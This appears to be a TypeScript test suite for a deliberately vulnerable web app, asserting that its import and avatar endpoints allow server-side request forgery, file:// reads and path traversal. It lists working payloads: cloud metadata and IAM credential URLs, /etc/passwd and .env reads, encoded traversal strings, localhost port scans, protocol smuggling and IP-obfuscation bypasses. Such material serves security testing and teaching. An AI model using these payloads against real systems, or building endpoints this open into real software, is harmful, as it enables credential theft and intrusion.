import request from 'supertest';
import { app } from '../../src/server';
import { prisma, setupTestDatabase, testUsers } from '../setup';
import jwt from 'jsonwebtoken';
import * as fs from 'fs';
import * as path from 'path';

describe('SSRF (Server-Side Request Forgery) Vulnerability Tests', () => {
  let user1Token: string;
  let user1Id: number;

  beforeAll(async () => {
    const users = await setupTestDatabase();
    user1Id = users.user1.id;

    // Generate JWT token for testing
    user1Token = jwt.sign(
      { userId: user1Id, email: testUsers.user1.email },
      process.env.JWT_SECRET || 'weak-secret-key',
      { expiresIn: '1h' }
    );

    // Ensure uploads directory exists
    const uploadsDir = path.join(__dirname, '../../uploads');
    if (!fs.existsSync(uploadsDir)) {
      fs.mkdirSync(uploadsDir, { recursive: true });
    }
  });

  describe('Cloud Metadata Service Exploitation', () => {
    test('should allow access to AWS metadata service', async () => {
      const awsMetadataUrl = 'http://169.254.169.254/latest/meta-data/';
      
      const response = await request(app)
        .post('/api/tasks/import')
        .set('Authorization', `Bearer ${user1Token}`)
        .send({
          importUrl: awsMetadataUrl,
          format: 'json'
        });

      // Should succeed and return metadata (or error with network details)
      expect([200, 500].includes(response.status)).toBe(true);
      
      if (response.status === 200) {
        expect(response.body.success).toBe(true);
        expect(response.body.metadata).toBeDefined();
      } else {
        // Even error responses leak information
        expect(response.body.targetUrl).toBe(awsMetadataUrl);
        expect(response.body.networkError).toBeDefined();
      }
    });

    test('should allow access to AWS IAM credentials', async () => {
      const iamCredentialsUrl = 'http://169.254.169.254/latest/meta-data/iam/security-credentials/';
      
      const response = await request(app)
        .post('/api/tasks/import')
        .set('Authorization', `Bearer ${user1Token}`)
        .send({
          importUrl: iamCredentialsUrl,
          format: 'json'
        });

      expect([200, 500].includes(response.status)).toBe(true);
      
      if (response.status === 200) {
        expect(response.body.metadata).toBeDefined();
      }
    });

    test('should allow access to GCP metadata service', async () => {
      const gcpMetadataUrl = 'http://metadata.google.internal/computeMetadata/v1/';
      
      const response = await request(app)
        .post('/api/users/avatar')
        .set('Authorization', `Bearer ${user1Token}`)
        .send({
          imageUrl: gcpMetadataUrl,
          fetchFromUrl: true
        });

      expect([200, 500].includes(response.status)).toBe(true);
      
      // Should expose network error details
      if (response.status === 500) {
        expect(response.body.requestedUrl).toBe(gcpMetadataUrl);
        expect(response.body.internalError).toBeDefined();
      }
    });

    test('should allow access to Azure metadata service', async () => {
      const azureMetadataUrl = 'http://169.254.169.254/metadata/instance?api-version=2021-02-01';
      
      const response = await request(app)
        .post('/api/tasks/import')
        .set('Authorization', `Bearer ${user1Token}`)
        .send({
          importUrl: azureMetadataUrl,
          format: 'json'
        });

      expect([200, 500].includes(response.status)).toBe(true);
    });
  });

  describe('Internal Network Scanning', () => {
    test('should allow scanning localhost services', async () => {
      const localhostUrls = [
        'http://localhost:22',      // SSH
        'http://localhost:80',      // HTTP
        'http://localhost:443',     // HTTPS
        'http://localhost:3306',    // MySQL
        'http://localhost:5432',    // PostgreSQL
        'http://localhost:6379',    // Redis
        'http://localhost:27017',   // MongoDB
        'http://localhost:9200',    // Elasticsearch
      ];

      for (const url of localhostUrls) {
        const response = await request(app)
          .post('/api/users/avatar')
          .set('Authorization', `Bearer ${user1Token}`)
          .send({
            imageUrl: url,
            fetchFromUrl: true
          });

        // Should return network information even on failure
        expect([200, 500].includes(response.status)).toBe(true);
        
        if (response.status === 500) {
          expect(response.body.requestedUrl).toBe(url);
          expect(response.body.details || response.body.internalError).toBeDefined();
        }
      }
    });

    test('should allow scanning internal IP ranges', async () => {
      const internalIPs = [
        'http://192.168.1.1',
        'http://10.0.0.1',
        'http://172.16.0.1',
        'http://127.0.0.1:8080'
      ];

      for (const ip of internalIPs) {
        const response = await request(app)
          .post('/api/tasks/import')
          .set('Authorization', `Bearer ${user1Token}`)
          .send({
            importUrl: ip,
            format: 'json'
          });

        expect([200, 500].includes(response.status)).toBe(true);
        
        if (response.status === 500) {
          expect(response.body.targetUrl).toBe(ip);
        }
      }
    });

    test('should expose internal service responses', async () => {
      const response = await request(app)
        .post('/api/tasks/import')
        .set('Authorization', `Bearer ${user1Token}`)
        .send({
          importUrl: 'http://localhost:5432',
          format: 'json'
        });

      if (response.status === 200) {
        expect(response.body.internalService).toBeDefined();
        expect(response.body.headers).toBeDefined();
        expect(response.body.status).toBeDefined();
      }
    });
  });

  describe('Local File Inclusion (LFI)', () => {
    test('should allow reading system files via file:// protocol', async () => {
      const systemFiles = [
        'file:///etc/passwd',
        'file:///etc/hosts',
        'file:///proc/version',
        'file:///proc/cpuinfo'
      ];

      for (const fileUrl of systemFiles) {
        const response = await request(app)
          .post('/api/users/avatar')
          .set('Authorization', `Bearer ${user1Token}`)
          .send({
            imageUrl: fileUrl,
            fetchFromUrl: true
          });

        if (response.status === 200) {
          expect(response.body.success).toBe(true);
          expect(response.body.content).toBeDefined();
          
          // Verify we're reading actual file content
          if (fileUrl.includes('passwd')) {
            expect(response.body.content).toContain('root:');
          }
          if (fileUrl.includes('hosts')) {
            expect(response.body.content).toContain('localhost');
          }
        }
      }
    });

    test('should allow reading application configuration files', async () => {
      const configFiles = [
        'file://../.env',
        'file://../package.json',
        'file://../docker-compose.yml'
      ];

      for (const fileUrl of configFiles) {
        const response = await request(app)
          .post('/api/users/avatar')
          .set('Authorization', `Bearer ${user1Token}`)
          .send({
            imageUrl: fileUrl,
            fetchFromUrl: true
          });

        if (response.status === 200 && response.body.content) {
          // Verify we're reading actual config content
          if (fileUrl.includes('package.json')) {
            expect(response.body.content).toContain('"name"');
          }
        }
      }
    });

    test('should allow reading source code files', async () => {
      const sourceFiles = [
        'file://../src/server.ts',
        'file://../src/routes/auth.ts',
        'file://../prisma/schema.prisma'
      ];

      for (const fileUrl of sourceFiles) {
        const response = await request(app)
          .post('/api/users/avatar')
          .set('Authorization', `Bearer ${user1Token}`)
          .send({
            imageUrl: fileUrl,
            fetchFromUrl: true
          });

        if (response.status === 200 && response.body.content) {
          // Verify we're reading source code
          expect(typeof response.body.content).toBe('string');
          expect(response.body.content.length).toBeGreaterThan(0);
        }
      }
    });
  });

  describe('Path Traversal in File Serving', () => {
    test('should allow directory traversal to read system files', async () => {
      const traversalPaths = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\drivers\\etc\\hosts',
        '....//....//....//etc/passwd',
        '..%2f..%2f..%2fetc%2fpasswd',
        '..%252f..%252f..%252fetc%252fpasswd'
      ];

      for (const path of traversalPaths) {
        const response = await request(app)
          .get(`/api/files/${path}`)
          .set('Authorization', `Bearer ${user1Token}`);

        if (response.status === 200) {
          expect(response.text).toBeDefined();
          
          // Check if we successfully read system files
          if (path.includes('passwd')) {
            expect(response.text).toContain('root:');
          }
        } else if (response.status === 404) {
          // Even 404 responses might leak path information
          expect(response.body.path).toBeDefined();
        }
      }
    });

    test('should allow reading application files via path traversal', async () => {
      const appFiles = [
        '../package.json',
        '../.env',
        '../src/server.ts',
        '../../README.md'
      ];

      for (const file of appFiles) {
        const response = await request(app)
          .get(`/api/files/${file}`)
          .set('Authorization', `Bearer ${user1Token}`);

        if (response.status === 200) {
          expect(response.text).toBeDefined();
          expect(response.text.length).toBeGreaterThan(0);
        }
      }
    });
  });

  describe('Protocol Smuggling and Bypass Techniques', () => {
    test('should allow various protocol schemes', async () => {
      const protocols = [
        'ftp://ftp.example.com/',
        'gopher://localhost:70/',
        'dict://localhost:2628/',
        'ldap://localhost:389/',
        'sftp://localhost:22/'
      ];

      for (const url of protocols) {
        const response = await request(app)
          .post('/api/tasks/import')
          .set('Authorization', `Bearer ${user1Token}`)
          .send({
            importUrl: url,
            format: 'json'
          });

        // Should attempt the request regardless of protocol
        expect([200, 500].includes(response.status)).toBe(true);
      }
    });

    test('should allow URL encoding bypass', async () => {
      const encodedUrls = [
        'http://127.0.0.1:22',
        'http://127.1:22',
        'http://0x7f000001:22',
        'http://2130706433:22', // Decimal representation of 127.0.0.1
        'http://localhost:22'
      ];

      for (const url of encodedUrls) {
        const response = await request(app)
          .post('/api/users/avatar')
          .set('Authorization', `Bearer ${user1Token}`)
          .send({
            imageUrl: url,
            fetchFromUrl: true
          });

        expect([200, 500].includes(response.status)).toBe(true);
      }
    });

    test('should allow redirect-based SSRF', async () => {
      // This would test if the app follows redirects to internal services
      const redirectUrl = 'http://httpbin.org/redirect-to?url=http://localhost:22';
      
      const response = await request(app)
        .post('/api/tasks/import')
        .set('Authorization', `Bearer ${user1Token}`)
        .send({
          importUrl: redirectUrl,
          format: 'json'
        });

      expect([200, 500].includes(response.status)).toBe(true);
    });
  });

  describe('DNS Rebinding Attacks', () => {
    test('should allow DNS rebinding to localhost', async () => {
      // These would be actual DNS rebinding domains in a real test
      const rebindingUrls = [
        'http://localtest.me:22',      // Resolves to 127.0.0.1
        'http://vcap.me:22',           // Resolves to 127.0.0.1
        'http://lvh.me:22'             // Resolves to 127.0.0.1
      ];

      for (const url of rebindingUrls) {
        const response = await request(app)
          .post('/api/users/avatar')
          .set('Authorization', `Bearer ${user1Token}`)
          .send({
            imageUrl: url,
            fetchFromUrl: true
          });

        expect([200, 500].includes(response.status)).toBe(true);
      }
    });
  });

  describe('Information Disclosure via SSRF', () => {
    test('should expose detailed error information', async () => {
      const response = await request(app)
        .post('/api/tasks/import')
        .set('Authorization', `Bearer ${user1Token}`)
        .send({
          importUrl: 'http://non-existent-domain-12345.com',
          format: 'json'
        })
        .expect(500);

      // Should expose detailed network error information
      expect(response.body.error).toBeDefined();
      expect(response.body.targetUrl).toBe('http://non-existent-domain-12345.com');
      expect(response.body.networkError).toBeDefined();
      expect(response.body.errorCode).toBeDefined();
    });

    test('should expose response headers from internal services', async () => {
      const response = await request(app)
        .post('/api/tasks/import')
        .set('Authorization', `Bearer ${user1Token}`)
        .send({
          importUrl: 'http://localhost:3000', // Self-request
          format: 'json'
        });

      if (response.status === 200) {
        expect(response.body.headers).toBeDefined();
        expect(response.body.status).toBeDefined();
      } else if (response.status === 500) {
        expect(response.body.responseHeaders).toBeDefined();
        expect(response.body.responseStatus).toBeDefined();
      }
    });

    test('should expose timing information for port scanning', async () => {
      const startTime = Date.now();
      
      await request(app)
        .post('/api/users/avatar')
        .set('Authorization', `Bearer ${user1Token}`)
        .send({
          imageUrl: 'http://localhost:22',
          fetchFromUrl: true
        });
      
      const endTime = Date.now();
      const duration = endTime - startTime;
      
      // Timing information can be used to determine if ports are open
      expect(duration).toBeGreaterThan(0);
    });
  });

  describe('Advanced SSRF Exploitation', () => {
    test('should allow chaining SSRF with other vulnerabilities', async () => {
      // Attempt to use SSRF to access internal admin endpoints
      const adminEndpoints = [
        'http://localhost:3000/api/admin/users',
        'http://localhost:3000/api/internal/stats',
        'http://localhost:9000/metrics'
      ];

      for (const endpoint of adminEndpoints) {
        const response = await request(app)
          .post('/api/tasks/import')
          .set('Authorization', `Bearer ${user1Token}`)
          .send({
            importUrl: endpoint,
            format: 'json'
          });

        expect([200, 500].includes(response.status)).toBe(true);
      }
    });

    test('should allow SSRF to bypass IP-based access controls', async () => {
      // Test various localhost representations
      const localhostVariants = [
        'http://127.0.0.1:3000',
        'http://0.0.0.0:3000',
        'http://[::1]:3000',
        'http://localhost:3000'
      ];

      for (const variant of localhostVariants) {
        const response = await request(app)
          .post('/api/users/avatar')
          .set('Authorization', `Bearer ${user1Token}`)
          .send({
            imageUrl: variant,
            fetchFromUrl: true
          });

        expect([200, 500].includes(response.status)).toBe(true);
      }
    });
  });
});